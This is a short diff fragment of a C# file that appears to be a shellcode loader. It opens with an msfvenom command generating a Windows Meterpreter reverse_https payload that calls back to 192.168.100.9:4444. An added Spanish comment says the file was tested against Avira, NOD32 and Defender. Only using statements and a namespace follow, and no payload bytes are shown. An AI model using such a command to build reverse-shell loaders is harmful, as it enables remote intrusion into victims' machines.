@@ -1,4 +1,5 @@
 //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.100.9 LPORT=4444 -f csharp -o test.cs
+// detectado y probado en avira,nod32,defender
 using System;
 using System.Runtime.InteropServices;
 namespace ConsoleApp1
